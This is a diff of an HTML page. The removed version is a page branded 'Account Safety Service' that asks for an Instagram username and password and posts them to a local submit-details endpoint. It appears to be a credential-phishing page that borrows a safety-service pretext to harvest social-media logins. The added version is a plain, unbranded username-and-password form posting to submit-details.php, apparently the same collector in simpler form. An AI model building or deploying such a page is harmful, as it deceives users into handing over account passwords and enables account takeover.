@@ -3,112 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Safety</title>
-    <style>
-        /* Styles here */
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #ffffff;
-            color: #333333;
-            text-align: center;
-        }
-        header {
-            padding: 20px;
-            background-color: #4CAF50;
-            color: white;
-            font-size: 24px;
-            font-weight: bold;
-        }
-        .section {
-            padding: 40px 20px;
-        }
-        button {
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 16px;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        .form-group {
-            margin: 20px 0;
-        }
-        .form-group input {
-            width: 100%;
-            max-width: 300px;
-            padding: 10px;
-            margin: 0 auto;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        footer {
-            margin-top: 30px;
-            color: #666;
-            font-size: 14px;
-        }
-    </style>
+    <title>Submit Details</title>
 </head>
 <body>
-    <header>Account Safety Service</header>
-
-    <div class="section">
-        <h1>Enter Your Details</h1>
-        <form id="reportForm">
-            <div class="form-group">
-                <label for="username">Instagram Username</label>
-                <input type="text" id="username" placeholder="Enter your username" required>
-            </div>
-            <div class="form-group">
-                <label for="password">Instagram Password</label>
-                <input type="password" id="password" placeholder="Enter your password" required>
-            </div>
-            <button type="submit">Submit</button>
-        </form>
-    </div>
-
-    <footer>&copy; 2024 Account Safety Service | All rights reserved.</footer>
-
-    <script>
-        document.getElementById('reportForm').onsubmit = async function (e) {
-            e.preventDefault();
-
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            if (username && password) {
-                try {
-                    const response = await fetch('http://localhost:3000/submit-details', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ username, password })
-                    });
-
-                    const result = await response.json();
-                    if (response.ok) {
-                        alert(result.message); // Show server response
-                    } else {
-                        alert('Failed to submit details. Please try again.');
-                    }
-                } catch (error) {
-                    console.error('Error:', error);
-                    alert('An error occurred while submitting the form.');
-                }
-            } else {
-                alert('Please fill out all fields.');
-            }
-        };
-    </script>
+    <h1>Enter Your Details</h1>
+    <form action="submit-details.php" method="POST">
+        <div>
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" placeholder="Enter username" required>
+        </div>
+        <div>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" placeholder="Enter password" required>
+        </div>
+        <button type="submit">Submit</button>
+    </form>
 </body>
 </html>
-
-
-
